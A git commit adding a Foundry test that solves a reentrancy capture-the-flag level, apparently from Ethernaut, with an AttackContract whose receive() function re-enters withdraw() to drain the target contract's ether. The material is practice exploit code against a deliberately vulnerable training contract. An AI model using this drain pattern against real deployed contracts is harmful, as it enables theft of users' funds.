9ab2dc24c5c33e5169544208199a06fde5c1727c
vesla0x1 <vesla0x1@gmail.com>
2025-02-19 14:48:20 -0300

    feat: add reentrance solution

--- test/10_Reentrance.t.sol
+++ test/10_Reentrance.t.sol
@@ -5,6 +5,24 @@ pragma experimental ABIEncoderV2;
 import {Test, console} from "forge-std/Test.sol";
 import {Reentrance} from "../src/10_Reentrance.sol";
 
+contract AttackContract {
+    Reentrance public target;
+
+    constructor (Reentrance _target) public {
+        target = _target;
+    }
+
+    function exploit() payable public {
+        target.donate{value: msg.value}(address(this));
+        target.withdraw(msg.value);
+        msg.sender.transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        target.withdraw(msg.value);
+    }
+}
+
 contract TestReentrance is Test {
     address public player = address(0xbad);
     uint256 constant initialContractBalance = 0.1 ether;
@@ -21,6 +39,8 @@ contract TestReentrance is Test {
         vm.startPrank(player);
 
         // Your exploit goes here
+        AttackContract attack = new AttackContract(instance);
+        attack.exploit{value: initialPlayerBalance}();
 
         vm.stopPrank();
 
